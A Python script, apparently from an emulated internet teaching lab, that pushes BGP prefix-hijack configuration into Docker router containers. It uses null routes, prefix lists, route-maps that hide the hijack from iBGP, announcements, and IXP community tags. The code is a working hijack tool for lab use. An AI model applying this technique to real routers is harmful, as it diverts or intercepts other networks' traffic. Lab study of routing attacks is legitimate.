"""For all stub ASes, hijack the other stub in the same area."""

from pathlib import Path
import subprocess


AS_config_file = Path("config/AS_config.txt")
base_num = 151
router_ips = {}  # loopback ips.
source_subnets = {}  # router subnets from which matrix is sent.
with open(AS_config_file) as file:
    for line in file:
        asn, _, _, router_config_file, *_ = line.split()
        router_config_file = Path("config") / router_config_file
        if not router_config_file.exists():
            continue

        asn_ips = {}
        with open(router_config_file) as router_file:
            for id, line in enumerate(router_file):
                router, service, *_ = line.split()
                asn_ips[router] = f"{asn}.{151 + id}.0.1"

        if asn_ips:
            router_ips[int(asn)] = asn_ips

# TODO: make this a command line argument or something.
destination_ips_file = Path("groups/matrix/destination_ips.txt")
target_subnets = {}
with open(destination_ips_file) as file:
    for line in file:
        asn, measurement_ip = line.strip().split(' ')
        target_subnets[int(asn)] = f"{measurement_ip}/24"

# The ping sources use a special ip subnet.
source_subnets = {
    asn: f"{asn}.0.198.0/24"
    for asn in target_subnets
}


def hijack(*, attacker, victim, ases, ixp,
           peer_node, ixp_node,
           undo=False, dry=False):
    """Hijack victim prefix via IXP."""
    # First hijack ASes prefixes towards victim, i.e. at the node which has
    # a session with the victom.
    hijack_via_victim(attacker=attacker, node=peer_node,
                      victim=victim, ases=ases,
                      undo=undo, dry=dry)

    # Next, hijack prefix command via IXP.
    hijack_via_ixp(attacker=attacker, node=ixp_node,
                   victim=victim, ases=ases, ixp=ixp,
                   undo=undo, dry=dry)


def docker_exec(*, group, node, command, dry=False):
    """Run command in container."""
    # print(command)
    # return
    container = f"{group}_{node}router"
    if dry:
        print(f"Config for {container}:")
        print(command)
        return
    docker_cmd = f"docker exec {container} vtysh " + \
        " ".join([f"-c '{line}'" for line in command.splitlines()
                  if "#" not in line and line.strip()])
    subprocess.run(docker_cmd, shell=True)


def hijack_via_victim(*, attacker, node, victim, ases, undo=False, dry=False):
    """Attack hijacks AS prefixes towards victim.

    If `undo`, unset the hijack.
    """
    prefixes = (
        [f"{asn}.0.0.0/8" for asn in ases]
        + [source_subnets[asn] for asn in ases]
        + [target_subnets[asn] for asn in ases]
    )
    existing_map = f"LOCAL_PREF_OUT_{victim}"
    do_hijack(attacker=attacker, node=node,
              prefixes=prefixes,
              existing_map=existing_map,
              undo=undo, dry=dry)


def hijack_via_ixp(*, attacker, node, victim, ases, ixp, undo=False, dry=False):
    """Attack hijacks victim prefix via IXP."""
    prefixes = [
        f"{victim}.0.0.0/8",
        source_subnets[victim],
        target_subnets[victim],
    ]
    existing_map = f"IXP_OUT_{ixp} "
    communities = " ".join([f"{ixp}:{asn}" for asn in ases])
    community_update = f"set community {communities}"
    do_hijack(attacker=attacker, node=node,
              prefixes=prefixes,
              existing_map=existing_map, existing_map_update=community_update,
              undo=undo, dry=dry)


def do_hijack(*, attacker, node, prefixes, existing_map, existing_map_update="",
              min_seq=100, undo=False, dry=False):
    no = "no " if undo else ""
    # First get all static routes, otherwise we can't advertise the prefixes.
    static_routes = "\n".join([f"{no}ip route {prefix} Null0"
                               for prefix in prefixes])
    # Next prepare prefix lists for matching
    prefix_list = "\n".join([
        f"{no}ip prefix-list HIJACKED_PREFIX seq {min_seq + n} "
        f"permit {prefix}" for n, prefix in enumerate(prefixes)
    ])
    # Finally, we need to advertise the prefixes as well.
    announcements = "\n".join([f"{no}network {prefix}" for prefix in prefixes])

    # Do not send the hijacked prefix via iBGP by adding a route-map.
    ibgp_neighbors = [
        ip for router, ip in router_ips[attacker].items()
        if node not in router
    ]
    ibgp_routemap_assignment = "\n".join([
        f"{no}neighbor {neighbor} route-map NO_HIJACK out"
        for neighbor in ibgp_neighbors
    ])

    # Create command.
    command = f"""
conf t
# Ensure we can advertise the prefixes.
{static_routes}
# Configure prefix list for route-maps.
{prefix_list}
# Set up up route-maps.
# First update the existing one.
route-map {existing_map} permit {min_seq}
{no}match ip address prefix-list HIJACKED_PREFIX
{no + existing_map_update if existing_map_update else ""}
exit
{f"no route-map {existing_map} permit {min_seq}" if undo else ""}
# Second create the new map to prevent advertisting the hijack over iBGP.
route-map NO_HIJACK deny {min_seq}
{no}match ip address prefix-list HIJACKED_PREFIX
exit
{f"no route-map NO_HIJACK deny {min_seq}" if undo else ""}
# as part of that, let everything not blocked through.
route-map NO_HIJACK permit {min_seq + 1}
exit
{f"no route-map NO_HIJACK permit {min_seq + 1}" if undo else ""}
# Finally, announce hijacks and install route maps.
router bgp {attacker}
address-family ipv4 unicast
{announcements}
{ibgp_routemap_assignment}
exit
exit
""".strip()

    # Run or print command.
    docker_exec(group=attacker, node=node, command=command, dry=dry)


if __name__ == "__main__":
    undo = False
    dry = False
    hijack(attacker=5, victim=6, ases=[1, 3], ixp=81,
           peer_node="STGA", ixp_node="GENE", undo=undo, dry=dry)
    hijack(attacker=6, victim=5, ases=[2, 4], ixp=82,
           peer_node="STGA", ixp_node="GENE", undo=undo, dry=dry)
